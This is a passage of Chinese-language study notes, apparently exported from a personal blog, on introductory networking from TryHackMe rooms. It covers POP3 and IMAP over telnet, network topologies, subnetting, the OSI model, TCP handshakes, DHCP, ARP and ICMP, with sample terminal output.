10.10.28.0. Escape character is \u0026#39;^]\u0026#39;. +OK [XCLIENT] Dovecot (Ubuntu) ready. AUTH +OK PLAIN . USER strategos +OK PASS +OK Logged in. STAT +OK 3 1264 LIST +OK 3 messages: 1 407 2 412 3 445 . RETR 3 +OK 445 octets Return-path: \u0026lt;user@client.thm\u0026gt; Envelope-to: strategos@server.thm Delivery-date: Thu, 27 Jun 2024 16:19:35 +0000 Received: from [10.11.81.126] (helo=client.thm) by example.thm with smtp (Exim 4.95) (envelope-from \u0026lt;user@client.thm\u0026gt;) id 1sMrpq-0001Ah-UT for strategos@server.thm; Thu, 27 Jun 2024 16:19:35 +0000 From: user@client.thm To: strategos@server.thm Subject: Telnet email Hello. I am using telnet to send you an email! . QUIT +OK Logging out. Connection closed by foreign host. 捕获网络数据包的人将能够拦截交换的流量。根据之前的 Wireshark 捕获，红色的命令由客户端发送，蓝色的行是服务器的命令。同样明显的是，捕获流量的人可以读取密码。\nIMAP：同步电子邮件 POP3协议适用于单一设备场景（如您个人电脑上的常用邮件客户端）。然而，若您需要从办公室台式机、笔记本电脑或智能手机等多台设备访问邮箱，POP3的局限性便显现出来——它在客户端下载邮件后默认删除服务器上的副本，导致其他设备无法获取已下载的邮件。此时，您需改用支持多设备同步的协议，例如IMAP（互联网邮件访问协议）。IMAP会将邮件保留在服务器，并同步各设备的操作（如已读/删除标记），确保所有终端保持一致的邮箱状态。\nIMAP 允许同步已读、已移动和已删除的邮件。当您通过多个客户端查看电子邮件时，IMAP 非常方便。 与 POP3 不同，POP3 在从远程服务器下载和删除电子邮件时往往会最大限度地减少服务器存储空间，而 IMAP 往往会使用更多存储空间，因为电子邮件保存在服务器上并在电子邮件客户端之间同步。\nIMAP 协议命令比 POP3 协议命令更复杂。我们在下面列出了几个示例：\nLOGIN \u0026lt;username\u0026gt; \u0026lt;password\u0026gt; 验证用户身份 SELECT \u0026lt;mailbox\u0026gt; 选择要使用的邮箱文件夹 FETCH \u0026lt;mail_number\u0026gt; \u0026lt;data_item_name\u0026gt; 示例 fetch 3 body[] 来获取消息编号 3、标头和正文。 MOVE \u0026lt;sequence_set\u0026gt; \u0026lt;mailbox\u0026gt; 将指定的邮件移动到另一个邮箱 COPY \u0026lt;sequence_set\u0026gt; \u0026lt;data_item_name\u0026gt; 将指定的邮件复制到另一个邮箱 LOGOUT 注销 知道 IMAP 服务器默认监听 TCP 端口 143，我们将使用 telnet 连接到 10.10.28.0 的端口 143 并获取我们在之前任务中发送的消息。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 user@TryHackMe$ telnet 10.10.41.192 143 Trying 10.10.41.192... Connected to 10.10.41.192. Escape character is \u0026#39;^]\u0026#39;. * OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ STARTTLS AUTH=PLAIN] Dovecot (Ubuntu) ready. A LOGIN strategos A OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY PREVIEW STATUS=SIZE SAVEDATE LITERAL+ NOTIFY SPECIAL-USE] Logged in B SELECT inbox * FLAGS (\\Answered \\Flagged \\Deleted \\Seen \\Draft) * OK [PERMANENTFLAGS (\\Answered \\Flagged \\Deleted \\Seen \\Draft \\*)] Flags permitted. * 4 EXISTS * 0 RECENT * OK [UNSEEN 2] First unseen. * OK [UIDVALIDITY 1719824692] UIDs valid * OK [UIDNEXT 5] Predicted next UID B OK [READ-WRITE] Select completed (0.001 + 0.000 secs). C FETCH 3 body[] * 3 FETCH (BODY[] {445} Return-path: \u0026lt;user@client.thm\u0026gt; Envelope-to: strategos@server.thm Delivery-date: Thu, 27 Jun 2024 16:19:35 +0000 Received: from [10.11.81.126] (helo=client.thm) by example.thm with smtp (Exim 4.95) (envelope-from \u0026lt;user@client.thm\u0026gt;) id 1sMrpq-0001Ah-UT for strategos@server.thm; Thu, 27 Jun 2024 16:19:35 +0000 From: user@client.thm To: strategos@server.thm Subject: Telnet email Hello. I am using telnet to send you an email! ) C OK Fetch completed (0.001 + 0.000 secs). D LOGOUT * BYE Logging out D OK Logout completed (0.001 + 0.000 secs). Connection closed by foreign host. 下面的屏幕截图显示了从 Wireshark 中看到的客户端和服务器之间交换的消息。客户端只需要发送四个命令，以红色显示，“长”服务器响应以蓝色显示。\n总结 协议 传输协议 默认端口号 TELNET TCP 23 DNS UDP 或 TCP 53 HTTP TCP 80 HTTPS TCP 443 FTP TCP 21 SMTP TCP 25 POP3 TCP 110 IMAP TCP 143 ","date":"2025-01-08T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/night-3078326.jpg","permalink":"https://Yerucrem.github.io/p/%E7%BD%91%E7%BB%9C%E6%A0%B8%E5%BF%83%E5%8D%8F%E8%AE%AE/","title":"网络核心协议"},{"content":"网络基础 LAN简介 多年来，已经对各种网络设计进行了实验和实施。对于网络，当我们提到术语 “拓扑” 时，我们实际上指的是手头网络的设计或外观。下面我们来讨论一下这些拓扑的优缺点。\n星形拓扑 星形拓扑的主要前提是设备通过中央网络设备（如交换机或集线器）单独连接。这种拓扑是当今最常见的拓扑，因为它具有可靠性和可扩展性 - 尽管成本高昂。\n发送到此拓扑中设备的任何信息都通过它所连接的中央设备发送。让我们在下面探讨一下这种拓扑的一些优点和缺点：\n由于此拓扑需要更多的布线和购买专用网络设备，因此它比任何其他拓扑都更昂贵。然而，尽管成本增加，但这确实提供了一些显着的优势。例如，这种拓扑本质上更具可扩展性，这意味着随着网络需求的增加，很容易添加更多设备。\n遗憾的是，网络规模越大，保持网络正常运行所需的维护就越多。这种对维护的依赖增加也会使故障排除变得更加困难。此外，星形拓扑结构仍然容易出现故障 - 尽管有所减少。例如，如果连接设备的集中式硬件发生故障，这些设备将无法再发送或接收数据。值得庆幸的是，这些集中式硬件设备通常很强大。\n总线拓扑 这种类型的连接依赖于称为主干电缆的单个连接。这种类型的拓扑类似于树的叶子，因为设备（叶子）从此电缆上的树枝所在的位置开始。\n由于发往每个设备的所有数据都沿着同一根电缆传输，因此如果拓扑中的设备同时请求数据，则很快就会变得缓慢和瓶颈。这种瓶颈还会导致非常困难的故障排除，因为很快就会变得难以识别哪个设备遇到了问题，所有数据都沿着同一路径传输。\n然而，话虽如此，总线拓扑是更容易设置且更具成本效益的拓扑之一，因为它们需要花费，例如用于连接这些设备的布线或专用网络设备。\n最后，总线拓扑的另一个缺点是，在发生故障时几乎没有冗余。这个缺点是因为沿主干电缆存在单点故障。如果此电缆断开，设备将无法再沿总线接收或传输数据。\n环形拓扑 环形拓扑（也称为令牌拓扑）具有一些相似之处。计算机等设备直接相互连接以形成一个环路，这意味着几乎不需要布线，并且对专用硬件（例如在星形拓扑中）的依赖较小。\n环形拓扑的工作原理是跨循环发送数据，直到数据到达目标设备，并使用循环中的其他设备转发数据。有趣的是，如果设备没有要发送的数据，则它只会从此拓扑中的另一台设备发送接收到的数据。如果设备恰好有数据要发送，它将先发送自己的数据，然后再从另一台设备发送数据。\n由于数据只有一个方向可以穿过此拓扑，因此对出现的任何故障进行故障排除相当容易。然而，这是一把双刃剑，因为它不是一种有效的数据通过网络传输的方式，因为它可能必须先访问许多多个设备才能到达预期的设备。\n最后，环形拓扑不太容易出现瓶颈，例如在总线拓扑中，因为大量流量不会在任何时候通过网络传输。但是，这种拓扑的设计确实意味着诸如电缆切断或设备损坏等故障将导致整个网络中断。\n什么是交换机？ 交换机是网络中的专用设备，旨在聚合多个其他设备，例如计算机、打印机或任何其他使用以太网的支持联网的设备。这些不同的设备插入交换机的端口。交换机通常位于较大的网络中，例如企业、学校或类似规模的网络，其中有许多设备可以连接到网络。交换机可以通过 4、8、16、24、32 和 64 端口来连接大量设备，以便设备插入。\n交换机比较小的同类产品（集线器/中继器）效率更高。交换机跟踪连接到哪个端口的设备。这样，当它们收到数据包时，它不会像集线器那样将该数据包重复到每个端口，而是将其发送到预期目标，从而减少网络流量。\n交换机和路由器都可以相互连接。这样做的能力通过为数据添加多个路径来增加网络的冗余（可靠性）。如果一条路径出现故障，则可以使用另一条路径。虽然这可能会降低网络的整体性能，因为数据包必须花费更长的时间来传输，但没有停机时间 - 考虑到替代方案，这是一个很小的代价。\n什么是路由器？ 路由器的工作是连接网络并在它们之间传递数据。它通过使用路由来实现这一点（因此得名 router）\n路由是给跨网络传输数据的过程的标签。路由涉及在网络之间创建路径，以便成功传送此数据。\n当设备通过许多路径连接时，路由非常有用，如下面的示例图所示。\n子网划分入门 正如我们之前在整个模块中讨论的那样，网络可以找到各种形状和大小 - 从小到大。子网划分是指将网络在其内部拆分为更小的微型网络。把它想象成为你的朋友切蛋糕。只有一定数量的蛋糕可以吃，但每个人都想分一杯羹。子网划分就是你决定谁得到什么份额，并保留这个比喻蛋糕的这样一块。\n以一家企业为例;您将拥有不同的部门，例如：\n会计学 金融 人力资源 虽然您知道在现实生活中将信息发送到正确的部门的位置，但网络也需要知道。网络管理员使用子网划分对网络的特定部分进行分类和分配，以反映这一点。\n子网划分是通过拆分网络可容纳的主机数量来实现的，该主机数由称为子网掩码的数字表示。\n正如我们所记得的，IP 地址由四个称为八位字节的部分组成。子网掩码也是如此，它也表示为 4 个字节 （32 位） 的数字，范围从 0 到 255 （0-255）。\n子网以三种不同的方式使用 IP 地址：\n确定网络地址 确定主机地址 确定默认网关 让我们将这三个部分分为下表以了解它们的用途：\n类型 目的 解释 例 网络地址 此地址标识实际网络的起点，并用于标识网络的存在。 例如，IP 地址为 192.168.1.100 的设备将位于由 192.168.1.0 标识的网络上 192.168.1.0 主机地址 此处的 IP 地址用于标识子网上的设备 例如，设备的网络地址为 192.168.1.1 192.168.1.100 默认网关 默认网关地址是分配给网络上设备的特殊地址，该地址能够将信息发送到另一个网络 任何需要发送到不在同一网络上的设备（即不在 192.168.1.0 上）的数据都将被发送到此设备。这些设备可以使用任何主机地址，但通常使用网络中的第一个或最后一个主机地址（.1 或 .254） 192.168.1.254 现在，在小型网络中，例如在家中，您将位于一个子网上，因为您一次需要连接超过 254 台设备的可能性不大。\n但是，企业和办公室等场所将拥有更多的此类设备（PC、打印机、相机和传感器），这些设备将进行子网划分。\n子网划分提供了一系列好处，包括：\n效率 安全 完全控制 稍后我们将继续探讨子网划分如何提供这些好处;但是，就目前而言，我们需要了解的只是它的安全元素。让我们以街上的典型咖啡馆为例。这家咖啡馆将有两个网络：\n一个用于员工、收银机和设施的其他设备 一个供公众用作热点 子网划分允许您将这两个用例彼此分开，同时获得连接到更大网络（如 Internet）的好处。\nARP 回顾我们之前的任务，设备可以有两个标识符：MAC 地址和 IP 地址，简称 A ddress Resolution Protocol 或简称 ARP，是负责允许设备在网络上识别自己的技术。\n简单地说，ARP 允许设备将其 MAC 地址与网络上的 IP 地址相关联。网络上的每台设备都将保留与其他设备关联的 MAC 地址的日志。\n当设备希望与其他设备通信时，它们将向整个网络发送广播，以搜索特定设备。设备可以使用 ARP 查找设备的 MAC 地址（以及物理标识符）以进行通信。\nARP 是如何工作的？\n网络中的每个设备都有一个用于存储信息的分类账，称为缓存。在 ARP 上下文中，此缓存存储网络上其他设备的标识符。\n为了将这两个标识符（IP 地址和 MAC 地址）映射在一起，ARP 发送两种类型的消息：\nARP （ARP）请求 ARP （ARP）答 发送 ARP 请求时，会在网络上向其他设备广播一条消息，询问“拥有此 IP 地址的 mac 地址是什么？当其他设备收到该消息时，它们只有在拥有该 IP 地址时才会响应，并将发送包含其 MAC 地址的 ARP 回复 。请求设备现在可以记住此映射并将其存储在其 ARP 缓存中以备将来使用。\n下图说明了此过程：\nOSI模型 什么是OSI OSI 模型（或 Open Systems Interconnection 模型）是网络中使用的基本模型。 这个关键模型提供了一个框架，规定了所有联网设备将如何发送、接收和解释数据。\nOSI 模型的主要优点之一是，设备在与其他设备通信时可以在网络上具有不同的功能和设计。通过遵循 OSI 模型一致性的网络发送的数据可以被其他设备理解。\nOSI 模型由七层组成，如下图所示。每个层都有一组不同的职责，从第 7 层到第 1 层排列。\n在数据经过的每一层，都会发生特定的流程，并将信息添加到这些数据中，这就是我们将在本次会议中即将讨论的任务中讨论的内容。但是，现在，我们只需要了解此过程称为封装以及下图中 OSI 模型的外观：\n第一层 物理层 此层是最容易掌握的层之一。简单地说，此层引用网络中使用的硬件的物理组件，是您将找到的最低层。设备使用电信号在二进制编号系统（1 和 0）中相互传输数据。\n例如，连接设备的以太网电缆，如下图所示：\n第二层 数据链路层 数据链路层侧重于传输的物理寻址。它从网络层接收数据包（包括远程计算机的 IP 地址），并添加接收端点的物理 MAC（媒体访问控制）地址。每台支持网络的计算机内部都有一个 Network Interface Card （NIC）， 它带有一个唯一的 MAC 地址来识别它。\nMAC 地址由制造商设置并实际烧录到卡中;它们无法更改 - 尽管它们可以被欺骗。当信息通过网络发送时，它实际上是用于标识信息的确切发送位置的物理地址。\n此外，数据链路层的工作还包括以适合传输的格式呈现数据。\n第三层 网络层 OSI 模型的第三层（网络层）是路由和重新组装数据的魔力发生的地方（从这些小块到更大的块）。首先，路由只是确定这些数据块应发送到的最佳路径。\n虽然这一层的一些协议准确地确定了数据到达设备的 “最佳” 路径，但我们只能在网络模块的这个阶段知道它们的存在。简而言之，这些协议包括 OSPF （Open S hortest Path First） 和 RIP （Routing Information Protocol）。决定采用哪种路线的因素由以下因素决定：\n哪条路最短？即，数据包需要传输的设备数量最少。 什么路径最可靠？即，数据包之前是否在该路径上丢失过？ 哪条路径的物理连接速度更快？即，一条路径是使用铜缆连接（较慢）还是光纤（相当快）？ 在这一层，一切都通过 IP 地址处理，例如 192.168.1.100。能够使用 IP 地址传输数据包的设备（例如路由器）称为第 3 层设备，因为它们能够在 OSI 模型的第三层工作。\n第四层 传输层 OSI 模型的第 4 层在通过网络传输数据方面起着至关重要的作用，可能有点难以掌握。在设备之间发送数据时，它遵循两种不同的协议之一，这些协议是根据几个因素决定的：\nTCP 协议 UDP 协议 让我们从 TCP 开始。Transmission Control Protocol （TCP）。 顾名思义，该协议在设计时考虑了可靠性和保证。此协议在两个设备之间保留一个持续连接，用于发送和接收数据所需的时间。\n不仅如此，TCP 还将错误检查纳入其设计中。错误检查是 TCP 如何保证从会话层（第 5 层）中的小块发送的数据随后以相同的顺序接收和重组。\n让我们在下表中总结 TCP 的优缺点：\n**TCP 的优点 ** **TCP 的缺点 ** 保证数据的准确性。 需要在两个设备之间建立可靠的连接。如果未收到一小块数据，则无法使用整个数据块。 能够同步两个设备，以防止彼此被数据淹没。 慢速连接可能会给另一台设备带来瓶颈，因为连接将始终在接收计算机上保留。 执行更多的过程以实现可靠性。 TCP 比 UDP 慢得多，因为使用此协议的设备必须完成更多工作。 TCP 用于文件共享、Internet 浏览或发送电子邮件等情况。这种用法是因为这些服务要求数据准确和完整（拥有半个文件不好！\n在下图中，我们可以看到猫的图片是如何从 “webserver” 分解成小块数据（称为数据包）的，其中 “computer” 将猫的图片重新构建为正确的顺序。\n现在让我们进入 User Datagram Protocol（或简称 UDP）。该协议不如它的兄弟 TCP 协议先进。它没有 TCP 提供的许多功能，例如错误检查和可靠性。事实上，通过 UDP 发送的任何数据都会发送到计算机，无论它是否到达那里。两个设备之间没有同步或保证;只是希望最好，手指交叉。\n虽然这听起来很不利，但它确实有其优点，我们将在下表中进行布局：\nUDP 的优势 UDP 的缺点 UDP 比 TCP 快得多。 UDP 不关心是否收到数据。 UDP 让应用程序层（用户软件）决定是否可以控制数据包的发送速度。 从这个意义上说，它对软件开发人员来说是相当灵活的。 UDP 不会像 TCP 那样在设备上保留连续连接。 这意味着不稳定的连接会给用户带来糟糕的体验。 使用与之前相同的示例，我们现在可以看到“计算机”只接收了数据包 #1 和 #3，这意味着缺少一半的图像。\nUDP 在发送小块数据的情况下非常有用。\nTCP三次握手四次挥手 三次握手与四次挥手是TCP协议中用于建立和终止连接的关键机制，确保数据传输的可靠性。以下是详细解释：\n一、三次握手（建立连接） 目的：确保客户端与服务器双方具备收发数据的能力。 过程：\nSYN（客户端 → 服务器） 客户端发送SYN报文（SYN=1，seq=x），进入SYN_SENT状态。 作用：请求建立连接，并初始化序列号。 SYN-ACK（服务器 → 客户端） 服务器回应SYN-ACK报文（SYN=1，ACK=1，ack=x+1，seq=y），进入SYN_RCVD状态。 作用：确认收到请求，同时发送自身序列号。 ACK（客户端 → 服务器） 客户端发送ACK报文（ACK=1，ack=y+1，seq=x+1），双方进入ESTABLISHED状态。 作用：确认服务器的响应，完成连接建立。 为什么需要三次？\n防止已失效的请求报文突然传到服务器（如网络延迟导致重复SYN），避免资源浪费。 二、四次挥手（终止连接） 目的：确保双方数据收发完毕后再安全关闭连接。 过程：\nFIN（主动关闭方 → 被动关闭方） 主动方（如客户端）发送FIN报文（FIN=1，seq=u），进入FIN_WAIT_1状态。 作用：表示不再发送数据，但可接收数据。 ACK（被动关闭方 → 主动关闭方） 被动方回应ACK报文（ACK=1，ack=u+1，seq=v），进入CLOSE_WAIT状态。 作用：确认收到关闭请求，但可能继续发送未完成的数据。 FIN（被动关闭方 → 主动关闭方） 被动方发送FIN报文（FIN=1，ACK=1，ack=u+1，seq=w），进入LAST_ACK状态。 作用：表示自身数据已发送完毕，请求关闭连接。 ACK（主动关闭方 → 被动关闭方） 主动方回应ACK报文（ACK=1，ack=w+1，seq=u+1），进入TIME_WAIT状态（等待2MSL时间）。 作用：确认最终关闭，防止最后一个ACK丢失导致被动方重传FIN。 为什么需要四次？\nTCP是全双工通信，双方需独立关闭发送通道。 三、三次握手：建立连接（确保双方能正常通话） 场景：小明想约小美商量聚会计划。 第一次握手（SYN） 小明打电话给小美：“小美，你能听到我说话吗？”（发送 SYN 包） 状态：小明等待回应（SYN_SENT）。 第二次握手（SYN-ACK） 小美接听电话：“小明，我能听到！你能听到我吗？”（回复 SYN-ACK 包） 状态：小美等待小明确认（SYN_RCVD）。 第三次握手（ACK） 小明回应：“我能听到！”（发送 ACK 包） 状态：双方正式通话（ESTABLISHED），开始讨论聚会细节（数据传输）。 为什么需要三次？ 如果小明喊完第一句后，小美没回应，小明会重拨（避免网络延迟导致重复连接）。三次确认确保双方 ​​“听得到”且“能回应”​。\n四、四次挥手：断开连接（确保双方说完所有话） 场景：讨论结束，两人要挂电话。 第一次挥手（FIN） 小明说：“我要说的都说完了，挂了吧！”（发送 FIN 包） 状态：小明等待小美确认（FIN_WAIT_1）。 第二次挥手（ACK） 小美回应：“好的，我知道你说完了。”（回复 ACK 包） 状态：小美可能还有话要说（CLOSE_WAIT），小明等待小美结束（FIN_WAIT_2）。 第三次挥手（FIN） 小美补充：“我也说完了，挂了吧！”（发送 FIN 包） 状态：小美等待小明确认（LAST_ACK）。 第四次挥手（ACK） 小明最后回应：“好的，再见！”（发送 ACK 包） 状态：小明等待片刻（TIME_WAIT，防止小美没收到确认），双方挂断（CLOSED）。 为什么需要四次？ 因为两人要 ​各自确认“我说完了”且“你也说完了”​。小明先结束发言权，小美可能还有补充，最后双方才真正挂断。\n五、总结 三次握手：像打电话时的三次确认（“听得到吗？”→“听得到！你呢？”→“我也听得到！”）。 四次挥手：像挂电话时的四次告别（“我说完了”→“好”→“我也说完了”→“好，再见！”）。 技术映射：\nSYN：发起通话请求（“你能听到吗？”）。 ACK：确认收到消息（“好的”）。 FIN：结束发言（“我挂了啊”）。 第五层 会话层 一旦数据从表示层（第 6 层）正确转换或格式化，会话层（第 5 层）将开始创建和维护与数据目标的其他计算机的连接。建立连接后，将创建一个会话。当此连接处于活动状态时，会话也处于活动状态。\n会话层还负责关闭连接（如果连接有一段时间未使用或丢失）。此外，会话可以包含“检查点”，如果数据丢失，则只需要发送最新的数据，从而节省带宽。\n值得注意的是，会话是唯一的，这意味着数据不能在不同的会话之间传输，而实际上只能在每个会话之间传输。\n第六层 表示层 OSI 模型的第 6 层是开始进行标准化的层。由于软件开发人员可以以不同的方式开发任何软件，例如电子邮件客户端，因此无论软件如何工作，数据仍然需要以相同的方式处理。\n该层充当数据进出应用程序层（第 7 层）的转换器。接收计算机还将理解以一种格式发送到计算机的数据，这些数据以另一种格式发送给计算机。例如，当您发送电子邮件时，其他用户可能有其他电子邮件客户端发送给您，但电子邮件的内容仍需要显示相同的内容。\n数据加密（如访问安全站点时的 HTTPS）等安全功能位于此层。\n第七层 应用层 SI 模型的应用层是您最熟悉的层。之所以如此熟悉，是因为应用程序层是协议和规则所在的层，用于确定用户应如何与发送或接收的数据进行交互。\n日常应用程序（如电子邮件客户端、浏览器或文件服务器浏览软件（如 FileZilla）为用户提供了一个友好的 G 实时用户界面 （GUI）， 以便与发送或接收的数据进行交互。其他协议包括 DNS （Domain Name System），这是网站地址转换为 IP 地址的方式。\n","date":"2025-01-08T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/background06.jpg","permalink":"https://Yerucrem.github.io/p/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/","title":"网络基础"},{"content":"DHCP：提供我的网络设置 你去了你最喜欢的咖啡店，拿了你最喜欢的热饮，打开了你的笔记本电脑。您的笔记本电脑连接到商店的 WiFi 并自动配置网络，因此您现在可以在新的 TryHackMe 房间工作。您没有输入单个 IP 地址，但您的设备已全部设置完毕。让我们看看这是怎么发生的。\n每当我们想访问网络时，至少需要配置以下内容：\nIP 地址和子网掩码 路由器（或网关） DNS 服务器 每当我们将设备连接到新网络时，都必须根据新网络设置上述配置。手动配置这些设置是一个不错的选择，尤其是对于服务器。服务器不需要切换网络;您无需携带域控制器并将其连接到咖啡店 WiFi。此外，其他设备需要连接到服务器，并希望在特定的 IP 地址找到它们。\n拥有一种自动化的方式来配置连接的设备有很多好处。首先，它将使我们免于手动配置网络;这一点非常重要，尤其是对于移动设备。其次，它使我们免于地址冲突，即当两台设备配置相同的 IP 地址时。IP 地址冲突将阻止相关主机使用网络资源;这适用于本地资源和 Internet。解决方案在于使用动态主机配置协议 （DHCP）。DHCP 是依赖于 UDP 的应用程序级协议;服务器监听 UDP 端口 67，客户端从 UDP 端口 68 发送。默认情况下，您的智能手机和笔记本电脑配置为使用 DHCP。\nDHCP 遵循四个步骤：发现、提供、请求和确认 （DORA）：\nDHCP Discover ：客户端广播 DHCPDISCOVER 消息，查找本地 DHCP 服务器（如果存在）。\nDHCP Offer：服务器使用 DHCPOFFER 消息进行响应，其中包含可供客户端接受的 IP 地址。\nDHCP Request：客户端使用 DHCPREQUEST 消息进行响应，以指示它已接受提供的 IP。\nDHCP Acknowledge：服务器使用 DHCPACK 消息进行响应，以确认提供的 IP 地址现在已分配给此客户端。\n以下数据包捕获显示了上述四个步骤。在此示例中，客户端获取地址 192.168.66.133。\n1 2 3 4 5 user@TryHackMe$ tshark -r DHCP-G5000.pcap -n 1 0.000000 0.0.0.0 → 255.255.255.255 DHCP 342 DHCP Discover - Transaction ID 0xfb92d53f 2 0.013904 192.168.66.1 → 192.168.66.133 DHCP 376 DHCP Offer - Transaction ID 0xfb92d53f 3 4.115318 0.0.0.0 → 255.255.255.255 DHCP 342 DHCP Request - Transaction ID 0xfb92d53f 4 4.228117 192.168.66.1 → 192.168.66.133 DHCP 376 DHCP ACK - Transaction ID 0xfb92d53f 在 DHCP 数据包交换中，我们可以注意到以下内容：\n客户端在没有任何 IP 网络配置的情况下启动。它只有一个 MAC 地址。在第一个和第三个数据包 DHCP Discover 和 DHCP Request 中，搜索 DHCP 服务器的客户端仍然没有 IP 网络配置，并且尚未使用 DHCP 服务器提供的 IP 地址。因此，它将数据包从 IP 地址 0.0.0.0 发送到广播 IP 地址 255.255.255.255。 至于链路层，在第一个和第三个数据包中，客户端发送到广播 MAC 地址 ff：ff：ff：ff：ff：ff（ 在上面的输出中未显示）。DHCP 服务器在 DHCP 产品/服务中提供可用的 IP 地址以及网络配置。它使用客户端的目标 MAC 地址。（在此示例系统中，它使用了建议的 IP 地址。） 在 DHCP 进程结束时，我们的设备将收到访问网络甚至 Internet 所需的所有配置。特别是，我们希望 DHCP 服务器为我们提供了以下内容：\n用于访问网络资源的租用 IP 地址 将数据包路由到本地网络外部的网关 用于解析域名的 DNS 服务器（稍后会详细介绍） ARP：第三层IP地址至第二层MAC地址转换 我们在网络概念室中指出，当两台主机通过网络进行通信时，IP 数据包在通过第 2 层传输时被封装在数据链路帧中。请记住，我们使用的两个常见数据链路层是以太网 （IEEE 802.3） 和 WiFi （IEEE 802.11）。每当一台主机需要与同一以太网或 WiFi 上的另一台主机通信时，它必须在数据链路层帧内发送 IP 数据包。尽管它知道目标主机的 IP 地址，但它需要查找目标的 MAC 地址，以便创建正确的数据链路标头。\n如您所知，MAC 地址是一个 48 位数字，通常以十六进制表示法表示;例如，7C：DF：A1：D3：8C：5C 和 44：DF：65：D8：FE：6C 是我网络上的两个 MAC 地址。\n但是，同一以太网上的设备不需要一直知道彼此的 MAC 地址;他们只需要在通信时知道彼此的 MAC 地址。一切都围绕着 IP 地址。请考虑以下场景：您将设备连接到网络，如果该网络具有 DHCP 服务器，则设备会自动配置为使用特定网关（路由器）和 DNS 服务器。因此，您的设备知道 DNS 服务器的 IP 地址以解析任何域名;此外，当需要通过 Internet 发送数据包时，它知道路由器的 IP 地址。在所有这些场景中，不会显示 MAC 地址。但是，同一以太网上的两台设备在不知道彼此的 MAC 地址的情况下无法通信。\n提醒一下，在下面的屏幕截图中，我们在以太网帧中看到一个 IP 数据包。以太网帧标头包含：\n目标 MAC 地址 源 MAC 地址 类型（在本例中为 IPv4） 地址解析协议 （ARP） 可以在以太网上找到另一台设备的 MAC 地址。在下面的示例中，IP 地址为 192.168.66.89 的主机希望与 IP 地址为 192.168.66.1 的另一个系统通信。它发送一个 ARP 请求，要求 IP 地址为 192.168.66.1 的主机进行响应。ARP 请求从请求者的 MAC 地址发送到广播 MAC 地址 ff：ff：ff：ff：ff：ff：ff， 如第一个数据包所示。ARP 回复很快到达，IP 地址为 192.168.66.1 的主机使用其 MAC 地址进行响应。此时，两台主机可以交换数据链路层帧。\n1 2 3 user@TryHackMe$ tshark -r arp.pcapng -Nn 1 0.000000000 cc:5e:f8:02:21:a7 → ff:ff:ff:ff:ff:ff ARP 42 Who has 192.168.66.1? Tell 192.168.66.89 2 0.003566632 44:df:65:d8:fe:6c → cc:5e:f8:02:21:a7 ARP 42 192.168.66.1 is at 44:df:65:d8:fe:6c 如果我们使用 tcpdump，数据包将以不同的方式显示。它使用术语 ARP 请求 和 ARP 回复 。供您参考，输出显示在下面的终端中。\n1 2 3 user@TryHackMe$ tcpdump -r arp.pcapng -n -v 17:23:44.506615 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 192.168.66.1 tell 192.168.66.89, length 28 17:23:44.510182 ARP, Ethernet (len 6), IPv4 (len 4), Reply 192.168.66.1 is-at 44:df:65:d8:fe:6c, length 28 ARP 请求或 ARP 回复未封装在 UDP 甚至 IP 数据包中;它直接封装在以太网帧中。以下 ARP 回复显示了这一点。\nARP 被视为第 2 层，因为它处理 MAC 地址。其他人会争辩说它是第 3 层的一部分，因为它支持 IP 作。必须了解的是，ARP 允许从第 3 层寻址转换为第 2 层寻址。\nICMP：网络故障排除 Internet Control Message Protocol (ICMP)主要用于网络诊断和错误报告。两个常用命令依赖于 ICMP，它们在网络故障排除和网络安全方面非常有用。这些命令是：\nping：此命令使用 ICMP 测试与目标系统的连接并测量往返时间 （RTT）。换句话说，它可以用来了解目标是活着的，并且它的回复可以到达我们的系统。 traceroute：此命令在 Linux 和类 UNIX 系统上称为 traceroute，在 MS Windows 系统上称为 tracert。它使用 ICMP 来发现从主机到目标的路由。 Ping ping 命令发送 ICMP Echo 请求（ICMP 类型 8）。下面的屏幕截图显示了 IP 数据包中的 ICMP 消息。\n接收端的计算机以 ICMP Echo Reply （ICMP Type 0） 进行响应。\n许多事情可能会阻止我们得到回复。除了目标系统脱机或关闭的可能性之外，路径上的防火墙还可能会阻止 ping 工作所需的数据包。在下面的示例中，我们使用 -c 4 告诉 ping 命令在发送 4 个数据包后停止。\n1 2 3 4 5 6 7 8 9 10 user@TryHackMe$ ping 192.168.11.1 -c 4 PING 192.168.11.1 (192.168.11.1) 56(84) bytes of data. 64 bytes from 192.168.11.1: icmp_seq=1 ttl=63 time=11.2 ms 64 bytes from 192.168.11.1: icmp_seq=2 ttl=63 time=3.81 ms 64 bytes from 192.168.11.1: icmp_seq=3 ttl=63 time=3.99 ms 64 bytes from 192.168.11.1: icmp_seq=4 ttl=63 time=23.4 ms --- 192.168.11.1 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 3003ms rtt min/avg/max/mdev = 3.805/10.596/23.366/7.956 ms 输出显示没有数据包丢失;此外，它还计算往返时间 （RTT） 的最小值、平均值、最大值和标准差 （mDev）。\nTraceroute 我们如何使我们的系统和目标系统之间的每个路由器都显露出来呢？\nInternet 协议有一个称为Time-to-Live （TTL） 的字段，该字段指示数据包在被丢弃之前可以传输的最大路由器数。路由器在发送数据包之前将数据包的 TTL 递减 1。当 TTL 达到零时，路由器会丢弃数据包并发送 ICMP 超时消息（ICMP 类型 11）。（在这种情况下，“时间” 是以路由器的数量来衡量的，而不是秒数。\n以下终端输出显示了运行 traceroute 命令探测本机与 example.com 